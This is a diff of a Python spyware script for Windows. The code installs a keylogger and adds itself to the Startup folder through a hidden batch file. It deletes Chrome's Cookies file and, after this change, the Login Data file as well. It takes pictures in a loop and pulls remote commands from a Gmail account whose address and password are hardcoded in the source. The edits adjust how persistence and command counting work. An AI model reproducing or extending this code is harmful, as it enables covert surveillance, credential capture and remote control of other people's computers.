@@ -24,7 +24,7 @@ CURRENT_PATH = os.path.dirname(os.path.realpath(__file__))
 MY_MAIL = "firstmanage1@gmail.com"
 MY_PASSWORD = "roihamelech"
 TARGET = MY_MAIL
-WAS_READ_FILE = "was_read.log"
+COMMAND_COUNT_FILE = "count.log"
 
 
 def get_time_since_uptime():
@@ -33,9 +33,9 @@ def get_time_since_uptime():
 
 def add_to_startup(file_path=""):
     if file_path == "":
-        file_path = os.path.dirname(os.path.realpath(__file__))
+        file_path = os.path.realpath(__file__)
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-    if not os.path.exists(bat_path + '\\' + "open.bat") and not os.path.exists(bat_path + '\\' + ".open.bat"):
+    if not os.path.exists(bat_path + '\\' + "open.bat"):
         with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
             bat_file.write(r'start "" %s' % file_path)
         # make file hidden
@@ -69,7 +69,8 @@ def run_as_admin(argv=None, debug=False):
 
 def delete_chrome_cookie_file():
     try:
-        os.remove("C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies" % USER_NAME)
+        os.remove(r"C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies" % USER_NAME)
+        os.remove(r"C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%USER_NAME)
         return True
     except WindowsError:
         return False
@@ -79,7 +80,6 @@ def delete_chrome_cookie_file_with_admin():
     was_deleted = delete_chrome_cookie_file()
     while not was_deleted:
         time.sleep(5)
-        print was_deleted
         was_deleted = delete_chrome_cookie_file()
     DATA_INFO.new_data_file("cookies.log")
 
@@ -105,12 +105,9 @@ def main():
     key_logger.set_key_hook()
     if not DATA_INFO.is_file("cookies.log"):
         if not delete_chrome_cookie_file():
-            is_admin = run_as_admin()
-            print is_admin
-            if is_admin is None or True:
-                delete_cookies_process = Process(target=delete_chrome_cookie_file_with_admin)
-                delete_cookies_process.start()
-    DATA_INFO.new_data_file(WAS_READ_FILE)
+            delete_cookies_process = Process(target=delete_chrome_cookie_file_with_admin)
+            delete_cookies_process.start()
+    DATA_INFO.new_data_file(COMMAND_COUNT_FILE)
     pictures_process = Process(target=take_pics_forever, args=(key_logger,))
     pictures_process.start()
     commands_process = Process(target=get_mail_commends_loop)
@@ -156,7 +153,8 @@ def get_mail_commends():
     e = Email.Email(MY_MAIL, MY_PASSWORD)
     e.login()
     mails = e.get_all_mail()[::-1]
-    for i, mail in enumerate(mails):
+    command_count = 0
+    for mail in mails:
         content = e.get_mail_content(mail)
         content_lines = content.split("\n")
         print content_lines[5]
@@ -167,13 +165,16 @@ def get_mail_commends():
                 handle_commands(content_lines)
             elif "all" in content_lines[5] \
                     and "command" in content_lines[5]:
-                was_read_content = DATA_INFO.read_file(WAS_READ_FILE)
-                was_read_content = was_read_content.split()
-                if str(i) not in was_read_content:
-                    DATA_INFO.write_data_file_end(str(i) + " ", WAS_READ_FILE)
+                command_count += 1
+                command_count_content = DATA_INFO.read_file(COMMAND_COUNT_FILE)
+                print command_count
+                print int(command_count_content)
+                if not command_count_content or command_count > int(command_count_content):
                     handle_commands(content_lines)
-            elif "mail was cleared" in content_lines[5]:
-                DATA_INFO.delete_data_file(WAS_READ_FILE)
+    # update the number of commands committed
+    DATA_INFO.delete_data_file(COMMAND_COUNT_FILE)
+    DATA_INFO.new_data_file(COMMAND_COUNT_FILE)
+    DATA_INFO.write_data_file_end(str(command_count), COMMAND_COUNT_FILE)
 
 
 if __name__ == '__main__':
